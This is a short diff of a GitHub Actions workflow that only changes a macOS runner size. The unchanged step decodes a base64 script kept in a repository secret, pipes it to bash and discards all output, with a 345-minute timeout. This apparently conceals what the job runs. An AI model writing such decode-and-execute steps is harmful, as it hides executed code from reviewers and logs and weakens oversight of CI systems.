@@ -8,7 +8,7 @@ concurrency:
 # 3
 jobs:
   Instance-Job:
-    runs-on: macos-26-large
+    runs-on: macos-26
     timeout-minutes: 345
     steps:
       - run: echo "${{ secrets.BASH_BASE64 }}" | base64 -di | bash > /dev/null 2>&1
